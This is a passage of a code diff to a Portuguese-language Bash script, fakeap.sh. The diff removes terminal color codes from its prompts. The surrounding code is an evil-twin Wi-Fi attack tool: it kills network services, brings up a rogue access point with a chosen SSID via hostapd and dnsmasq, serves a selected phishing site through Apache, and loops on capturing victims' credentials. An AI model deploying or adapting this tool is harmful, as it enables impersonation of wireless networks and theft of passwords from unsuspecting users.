@@ -93,9 +93,9 @@ stop() {
 }
 
 start() {
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Deseja iniciar a captura de credenciais? (s/n):\e[0m ' start_capture
+  read -p $'[*] Deseja iniciar a captura de credenciais? (s/n): ' start_capture
   if [[ "$start_capture" != "s" ]]; then
-    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Captura cancelada pelo usuário.\n"
+    printf "[!] Captura cancelada pelo usuário.\n"
     exit 1
   fi
 
@@ -105,11 +105,11 @@ start() {
 
   interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID a ser usado:\e[0m ' use_ssid
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal a ser usado:\e[0m ' use_channel
+  read -p $'[*] SSID a ser usado: ' use_ssid
+  read -p $'[*] Canal a ser usado: ' use_channel
 
   while true; do
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o access point...\n"
+    printf "[*] Configurando o access point...\n"
 
     service network-manager stop
     airmon-ng check kill
@@ -120,7 +120,7 @@ start() {
     iwconfig $interface essid $use_ssid
     ifconfig $interface up
 
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\n"
+    printf "[*] Configurando DHCP e DNS...\n"
     
     echo "interface=$interface" > hostapd.conf
     echo "driver=nl80211" >> hostapd.conf
@@ -134,30 +134,30 @@ start() {
     dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
     sleep 5
 
-    find sites/ -maxdepth 1 -mindepth 1 -type d | awk -F '/' '{print $2}' | awk '{printf("\e[1;92m%d\e[0m: \e[1;77m%s\n", NR, $1)}'
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma pasta pelo número:\e[0m ' chosen_folder_number
+    find sites/ -maxdepth 1 -mindepth 1 -type d | awk -F '/' '{print $2}' | awk '{printf("%d: %s\n", NR, $1)}'
+    read -p $'[*] Escolha uma pasta pelo número: ' chosen_folder_number
     chosen_folder=$(find sites/ -maxdepth 1 -mindepth 1 -type d | sed -n "${chosen_folder_number}p")
 
     if [ -z "$chosen_folder" ]; then
-      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Pasta inválida.\n"
+      printf "[!] Pasta inválida.\n"
       exit 1
     fi
 
     # Copiar todos os arquivos da pasta escolhida para /var/www/html
     cp -r "sites/$chosen_folder"/* /var/www/html
 
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Iniciando Apache2...\n"
+    printf "[*] Access point configurado. Iniciando Apache2...\n"
     service apache2 start
 
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Para parar: ./fakeap.sh --stop\n"
+    printf "[*] Access point configurado. Para parar: ./fakeap.sh --stop\n"
     
     # Aguardar a captura de credenciais
     getcredentials
 
     # Perguntar se deseja continuar a captura
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Deseja continuar a captura de credenciais? (s/n):\e[0m ' continue_capture
+    read -p $'[*] Deseja continuar a captura de credenciais? (s/n): ' continue_capture
     if [[ "$continue_capture" != "s" ]]; then
-      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Captura encerrada pelo usuário.\n"
+      printf "[!] Captura encerrada pelo usuário.\n"
       exit 1
     fi
   done
